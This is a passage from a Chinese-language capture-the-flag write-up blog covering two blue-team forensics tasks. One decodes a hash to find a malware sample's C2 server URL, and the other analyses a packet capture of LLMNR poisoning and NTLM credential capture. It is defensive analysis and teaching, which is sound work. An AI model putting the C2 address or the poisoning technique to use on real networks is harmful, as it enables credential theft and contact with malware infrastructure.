<code>X-Auth-Token: FhCTF</code> 欄位,可以推測 <code>FhCTF</code> 很可能就是用於加密 Target_ID 的金鑰。</p><ul><li>使用 Python 對十六進制字串進行 XOR 解密:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&quot;775a20657e725a206725250925317172587b3774750d2132747f5a2631752251&quot;</span></span><br><span class="line">key = <span class="string">&quot;FhCTF&quot;</span></span><br><span class="line"></span><br><span class="line">hex_bytes = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line">result = <span class="built_in">bytearray</span>()</span><br><span class="line">key_bytes = key.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_bytes):</span><br><span class="line">    result.append(byte ^ key_bytes[i % <span class="built_in">len</span>(key_bytes)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>將解密得到的 MD5 hash <code>12c1842c3ccafe7408c23ebf292ee3d9</code> 提交到 VirusTotal 進行查詢。<br><img src="/img/FhCTF/59.webp" alt="image"><br>在 VirusTotal 的分析報告中,可以找到該惡意軟體的 C2 通訊目標:</p><ul><li><strong>C2 伺服器</strong>: <code>http://171.22.28.221/5c06c05b7b34e8e6.php</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;http://171.22.28.221/5c06c05b7b34e8e6.php&#125;</span><br></pre></td></tr></table></figure><h3 id="🧩-User’s-Bad-Day"><a href="#🧩-User’s-Bad-Day" class="headerlink" title="🧩 User’s Bad Day"></a>🧩 User’s Bad Day</h3><p>給出的線索是一段封包紀錄，要求從中找出三個關鍵資訊：主機名稱、帳號名稱與檔案名稱，最後依指定格式組成 Flag。</p><ul><li><p>DNS 查詢中的主機名稱</p><p>在封包最前面可以看到一個 DNS 封包，內容類似：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS Standard query A fulesrv.local</span><br></pre></td></tr></table></figure><p>這代表使用者原本想連線的主機是 <code>fulesrv.local</code>。<br>題目提示「主機名稱不含 domain」，因此只取前半段：</p><ul><li>主機名稱（不含 domain）：<code>fulesrv</code></li></ul><p>✅ 主機名稱 &#x3D; <code>fulesrv</code></p></li><li><p>DNS 失敗與 LLMNR 啟用</p><p>當 DNS 查詢失敗時，Windows 會嘗試使用 LLMNR（Link-Local Multicast Name Resolution）來解析同一個名稱。<br>封包中可看到類似：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LLMNR query A fulesrv</span><br></pre></td></tr></table></figure><p>這表示系統改用 LLMNR 發送名稱查詢，詢問「誰是 fulesrv？」</p></li><li><p>LLMNR Poisoning「怪事」的來源</p><p>在這個階段，攻擊者主機（例如 IP：<code>192.168.50.200</code>）偽裝成 fulesrv 回應這個 LLMNR 查詢，聲稱自己就是目標伺服器。<br>結果：</p><ul><li>使用者誤以為解析成功，實際上連到的是攻擊者主機。</li><li>之後便會對攻擊者的 IP 建立 SMB 連線（TCP 445），並送出驗證資訊。</li></ul><p>這就是典型的 <strong>LLMNR Poisoning</strong> 攻擊流程，也是題目「User’s Bad Day」名稱的由來。</p></li><li><p>帳號名稱：從 NTLM 驗證中取得使用者帳號</p><p>當使用者透過 SMB 連向假冒的伺服器時，會進行 NTLM 驗證流程，其中會包含 <code>NTLMSSP AUTHENTICATE_MESSAGE</code> 封包。<br>在這類封包中，通常可解析出：</p><ul><li>Domain Name</li><li>User Name</li><li>Workstation Name</li></ul><p>將封包中的 Unicode（UTF-16LE）字串解碼後，可以得到：</p><ul><li>Domain Name：<code>DOMAIN</code></li><li>User Name：<code>Bob</code></li><li>Workstation：<code>WORKST</code></li></ul><p>題目問的是「攻擊者攔截到的帳號名稱」，也就是 NTLM 驗證裡的使用者名稱：</p><p>✅ 帳號名稱 &#x3D; <code>Bob</code></p></li><li><p>檔案名稱：從 SMB 封包中的字串還原</p><p>在後續 SMB 封包中，會出現使用者嘗試存取的檔案路徑或檔案名稱。題目提示要注意 UTF-16LE 編碼，因此用十六進制觀看封包內容時可以看到類似：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74 00 65 00 73 00 74 00</span><br></pre></td></tr></table></figure><p>將這串 bytes 以 UTF-16LE 解碼：</p><ul><li><code>74 00</code> → <code>&#39;t&#39;</code></li><li><code>65 00</code> → <code>&#39;e&#39;</code></li><li><code>73 00</code> → <code>&#39;s&#39;</code></li><li><code>74 00</code> → <code>&#39;t&#39;</code></li></ul><p>合起來就是：</p><ul><li><code>test</code></li></ul><p>題目同時強調「檔案名稱不含副檔名」，所以即便實際檔案可能是 <code>test.txt</code>、<code>test.docx</code> 等，在 Flag 中只需要檔名本體：</p><p>✅ 檔案名稱 &#x3D; <code>test</code></p><p>依題目指定格式：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;主機名稱_帳號代號_檔案名稱&#125;</span><br></pre></td></tr></table></figure><p>將前面三個已確認的答案依序代入：</p><ul><li>主機名稱：<code>fulesrv</code></li><li>帳號代號（帳號名稱）：<code>Bob</code></li><li>檔案名稱：<code>test</code></li></ul><p>得到最終 Flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;fulesrv_Bob_test&#125;</span><br></pre></td></tr></table></figure></li></ul></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="/img/avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="/img/avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">伊藤蒼太</div><div class="post-copyright__author_desc">Professional Bug Creator</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="該文章為原創文章，注意版權協議" href="https://itousouta15.tw/2026/01/01/FhCTF/">原創</a><a class="post-copyright-title"><span onclick='rm.copyPageUrl("https://itousouta15.tw/2026/01/01/FhCTF/")'>FhCTF 11401</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://itousouta15.tw" target="_blank">itouSouta</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tags-punctuation"><i class="anzhiyufont anzhiyu-icon-tag"></i></span>資安<span class="tagsPageCount">2</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/08/27/hexo/"><img class="prev-cover" src="/img/Hexo/hexo_github.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">使用 GitHub Pages + Hexo 架設個人BLOG</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size:1.5rem;margin-right:4px"></i><span>相關推薦</span></div><div class="relatedPosts-list"><div><a href="/2025/07/11/ais3preexam/" title="AIS3 pre-exam 2025"><img class="cover" src="/img/ais3/ais3.webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-11</div><div class="title">AIS3 pre-exam 2025</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 評論</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left:4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar" width="120" height="120"></div><div class="author-info__description">嗚嗚嗚寒假別走</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">伊藤蒼太</h1><div class="author-info__desc">Professional Bug Creator</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/itousouta15" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3493135988558536?spm_id_from=333.1007.0.0" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">歡迎來到我的秘密基地鴨~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目錄</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sanity-Check"><span class="toc-number">1.1.</span> <span class="toc-text">Sanity Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Christmas-Tree"><span class="toc-number">1.2.</span> <span class="toc-text">Christmas Tree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A7%AD%E5%AE%A2%E7%9A%84%E5%AF%86%E7%A2%BC%E9%A3%9F%E8%AD%9C"><span class="toc-number">1.3.</span> <span class="toc-text">駭客的密碼食譜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%91%E8%A9%B1%E5%A4%A7%E5%B8%AB"><span class="toc-number">1.4.</span> <span class="toc-text">笑話大師</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB"><span class="toc-number">1.5.</span> <span class="toc-text">分享圖庫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB-Revenge"><span class="toc-number">1.6.</span> <span class="toc-text">分享圖庫 Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Compile"><span class="toc-number">1.7.</span> <span class="toc-text">Python Compile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Survey"><span class="toc-number">2.</span> <span class="toc-text">Survey</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Survey-1"><span class="toc-number">2.1.</span> <span class="toc-text">Survey</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#INTERNAL-LOGIN"><span class="toc-number">3.1.</span> <span class="toc-text">INTERNAL LOGIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Robots"><span class="toc-number">3.2.</span> <span class="toc-text">Web Robots</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Doors-Open"><span class="toc-number">3.3.</span> <span class="toc-text">Doors Open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Visual-Blind-Spot"><span class="toc-number">3.4.</span> <span class="toc-text">The Visual Blind Spot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYSTEM-ROOT-SHELL"><span class="toc-number">3.5.</span> <span class="toc-text">SYSTEM ROOT SHELL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-to-Cybersecurity-Jungle"><span class="toc-number">3.6.</span> <span class="toc-text">Welcome to Cybersecurity Jungle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Templating-Danger"><span class="toc-number">3.7.</span> <span class="toc-text">Templating Danger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Documents"><span class="toc-number">3.8.</span> <span class="toc-text">Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG-ACCESS"><span class="toc-number">3.9.</span> <span class="toc-text">LOG ACCESS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pathway-leak"><span class="toc-number">3.10.</span> <span class="toc-text">Pathway-leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KID"><span class="toc-number">3.11.</span> <span class="toc-text">KID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Something-You-Put-Into"><span class="toc-number">3.12.</span> <span class="toc-text">Something You Put Into</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E6%98%93%E8%85%B3%E6%9C%AC%E9%96%B1%E8%AE%80%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text">簡易腳本閱讀器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OBF"><span class="toc-number">4.2.</span> <span class="toc-text">OBF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Lock"><span class="toc-number">4.3.</span> <span class="toc-text">The Lock</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B8-main-%E9%82%8F%E8%BC%AF"><span class="toc-number">4.3.1.</span> <span class="toc-text">主函數 (main) 邏輯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%97%E8%AD%89%E5%87%BD%E6%95%B8-check-password-%E5%88%86%E6%9E%90"><span class="toc-number">4.3.2.</span> <span class="toc-text">驗證函數 (check_password) 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%94%E7%AE%97%E6%B3%95%E9%82%84%E5%8E%9F%E8%88%87%E9%80%86%E5%90%91"><span class="toc-number">4.3.3.</span> <span class="toc-text">演算法還原與逆向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%B5%82%E7%B5%90%E6%9E%9C"><span class="toc-number">4.3.4.</span> <span class="toc-text">最終結果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%9E%E6%8E%89%E7%9A%84%E8%A7%A3%E7%A2%BC%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text">壞掉的解碼器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="toc-number">5.1.</span> <span class="toc-text">安全的加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encode-By-Py-%F0%9F%98%98"><span class="toc-number">5.2.</span> <span class="toc-text">Encode By Py 😘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DES-Lv-1-%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8F"><span class="toc-number">5.3.</span> <span class="toc-text">DES Lv.1 - 老船長的寶藏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DES-Lv-2-%E2%80%93-%E5%86%8D%E6%8E%A2%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8F%EF%BC%88Write-up%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">DES Lv.2 – 再探老船長的寶藏（Write-up）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%93%A1%E7%9A%84%E5%AF%86%E7%A2%BC%E6%B4%8B%E8%94%A5"><span class="toc-number">5.5.</span> <span class="toc-text">管理員的密碼洋蔥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">6.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Art-Work"><span class="toc-number">6.1.</span> <span class="toc-text">Art Work</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trace-the-Landmark"><span class="toc-number">6.2.</span> <span class="toc-text">Trace the Landmark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B61"><span class="toc-number">6.3.</span> <span class="toc-text">島1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-FH-Gift"><span class="toc-number">6.4.</span> <span class="toc-text">The FH Gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-1"><span class="toc-number">6.5.</span> <span class="toc-text">工商時間 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-2"><span class="toc-number">6.6.</span> <span class="toc-text">工商時間 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lithium-exploration"><span class="toc-number">6.7.</span> <span class="toc-text">Lithium exploration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SRL"><span class="toc-number">6.8.</span> <span class="toc-text">SRL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B62"><span class="toc-number">6.9.</span> <span class="toc-text">島2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-1"><span class="toc-number">6.10.</span> <span class="toc-text">漂亮的圓頂 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-2"><span class="toc-number">6.11.</span> <span class="toc-text">漂亮的圓頂 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%92%E6%88%B4%E5%AE%89%E5%85%A8%E5%B8%BD%E7%9A%84%E9%A8%8E%E5%A3%AB"><span class="toc-number">6.12.</span> <span class="toc-text">沒戴安全帽的騎士</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXIF%E7%9A%84%E3%80%8C%E6%8B%8D%E6%94%9D%E5%BA%A7%E6%A8%99%E3%80%8D"><span class="toc-number">6.13.</span> <span class="toc-text">EXIF的「拍攝座標」</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blue-team"><span class="toc-number">7.</span> <span class="toc-text">Blue team</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E8%A8%82%E5%96%AE"><span class="toc-number">7.1.</span> <span class="toc-text">大訂單</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-User%E2%80%99s-Bad-Day"><span class="toc-number">7.2.</span> <span class="toc-text">🧩 User’s Bad Day</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近發布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/01/FhCTF/" title="FhCTF 11401"><img src="/img/FhCTF.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="FhCTF 11401" width="100%" height="auto" loading="lazy"></a><div class="content"><a class="title" href="/2026/01/01/FhCTF/" title="FhCTF 11401">FhCTF 11401</a><time datetime="2026-01-01T00:00:00.000Z" title="發表於 2026-01-01 00:00:00">2026-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/27/hexo/" title="使用 GitHub Pages + Hexo 架設個人BLOG"><img src="/img/Hexo/hexo_github.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="使用 GitHub Pages + Hexo 架設個人BLOG" width="100%" height="auto" loading="lazy"></a><div class="content"><a class="title" href="/2025/08/27/hexo/" title="使用 GitHub Pages + Hexo 架設個人BLOG">使用 GitHub Pages + Hexo 架設個人BLOG</a><time datetime="2025-08-27T14:32:32.000Z" title="發表於 2025-08-27 14:32:32">2025-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/11/ais3preexam/" title="AIS3 pre-exam 2025"><img src="/img/ais3/ais3.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="AIS3 pre-exam 2025" width="100%" height="auto" loading="lazy"></a><div class="content"><a class="title" href="/2025/07/11/ais3preexam/" title="AIS3 pre-exam 2025">AIS3 pre-exam 2025</a><time datetime="2025-07-11T13:32:32.000Z" title="發表於 2025-07-11 13:32:32">2025-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/11/zerojudge/" title="Zerojudge 程式解題筆記"><img src="/img/ZJ.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="Zerojudge 程式解題筆記" width="100%" height="auto" loading="lazy"></a><div class="content"><a class="title" href="/2025/07/11/zerojudge/" title="Zerojudge 程式解題筆記">Zerojudge 程式解題筆記</a><time datetime="2025-07-11T12:00:00.000Z" title="發表於 2025-07-11 12:00:00">2025-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/firstblog/" title="第一次架網站的心得"><img src="/img/mainweb.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="第一次架網站的心得" width="100%" height="auto" loading="lazy"></a><div class="content"><a class="title" href="/2025/04/04/firstblog/" title="第一次架網站的心得">第一次架網站的心得</a><time datetime="2025-04-04T18:29:32.000Z" title="發表於 2025-04-04 18:29:32">2025-04-04</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" target="_blank" rel="noopener" href="https://space.bilibili.com/3493135988558536?spm_id_from=333.1007.0.0" title="Bilibili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a><a class="deal_link" href="/atom.xml" title="RSS"><i class="anzhiyufont anzhiyu-icon-rss"></i></a><img class="footer_mini_logo" title="返回頂部" alt="返回頂部" onclick="anzhiyu.scrollToDest(0,500)" src="/img/avatar.jpg" size="50px"><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/itousouta15" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="deal_link" href="/copyright" title="CC"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i></a></div><div id="anzhiyu-footer"><div class="footer-group"><div class="footer-title">連結</div><div class="footer-links"><a class="footer-item" title="BLOG" target="_blank" rel="noopener" href="https://blog.itousouta15.tw">BLOG</a><a class="footer-item" title="SCAICT 中電會" target="_blank" rel="noopener" href="https://SCAICT.org">SCAICT 中電會</a></div></div><div class="footer-group"><div class="footer-title">主題</div><div class="footer-links"><a class="footer-item" title="源碼" target="_blank" rel="noopener" href="https://github.com/itousouta15/itousouta15.github.io">源碼</a><a class="footer-item" title="開發日誌" href="/2025/10/05/devlog/">開發日誌</a></div></div><div class="footer-group"><div class="footer-title">導航</div><div class="footer-links"><a class="footer-item" title="碎碎念" href="/essay/">碎碎念</a><a class="footer-item" title="留言板" href="/comments/">留言板</a></div></div><div class="footer-group"><div class="footer-title">協議</div><div class="footer-links"><a class="footer-item" title="隱私協議" href="/privacy/">隱私協議</a><a class="footer-item" title="版權協議" href="/copyright/">版權協議</a></div></div><div class="footer-group"><div class="footer-title-group"><div class="footer-title">友鏈</div><a class="random-friends-btn" id="footer-random-friends-btn" href="javascript:addFriendLinksInFooter();" title="换一批友情链接"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i></a></div><div class="footer-links" id="friend-links-in-footer"></div></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="BLOG框架为Hexo_v7.3.0" title="BLOG框架为Hexo_v7.3.0"><img src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="BLOG框架为Hexo_v7.3.0"></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站項目由Github托管" title="本站項目由Github托管"><img src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站項目由Github托管"></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站採用知識共享署名－非商業性使用－相同方式共享 4.0 國際許可協議進行許可" title="本站採用知識共享署名－非商業性使用－相同方式共享 4.0 國際許可協議進行許可"><img src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站採用知識共享署名－非商業性使用－相同方式共享 4.0 國際許可協議進行許可"></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2025 - 2026 By <a class="footer-bar-link" href="/" title="伊藤蒼太" target="_blank">伊藤蒼太</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主題">主題</a><a class="footer-bar-link cc" href="/copyright" title="cc协议"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-by-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nc-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nd-line"></i></a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/" title="tag"><div class="headline">標籤</div><div class="length-num">5</div></a><a href="/categories/" title="category"><div class="headline">分類</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="顯示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>顯示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">網頁</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.itousouta15.tw" title="BLOG"><img class="back-menu-item-icon" src="/img/banner.webp" alt="BLOG"><span class="back-menu-item-text">BLOG</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://SCAICT.org" title="SCAICT 中電會"><img class="back-menu-item-icon" src="https://scaict.org/src/img/logo.svg" alt="SCAICT 中電會"><span class="back-menu-item-text">SCAICT 中電會</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">社群連結</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://x.com/itou_souta15" title="X (Twitter)"><img class="back-menu-item-icon" src="https://raw.githubusercontent.com/ant-design/ant-design-icons/080054b2dbcd56e413b2b89ef1a90bf79b20303f/packages/icons-svg/svg/filled/x.svg" alt="X (Twitter)"><span class="back-menu-item-text">X (Twitter)</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/itousouta15" title="GitHub"><img class="back-menu-item-icon" src="https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png" alt="GitHub"><span class="back-menu-item-text">GitHub</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://discord.gg/uAX6h9VmA4" title="Discord"><img class="back-menu-item-icon" src="https://www.svgrepo.com/show/353655/discord-icon.svg" alt="Discord"><span class="back-menu-item-text">Discord</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.threads.net/@itou.souta15" title="Threads"><img class="back-menu-item-icon" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/threads-app-icon.png" alt="Threads"><span class="back-menu-item-text">Threads</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://instagram.com/itousouta15" title="Instagram"><img class="back-menu-item-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/960px-Instagram_logo_2022.svg.png?20220518162235" alt="Instagram"><span class="back-menu-item-text">Instagram</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size:.9em"></i><span> 歸檔</span></a></li><li><a class="site-page child 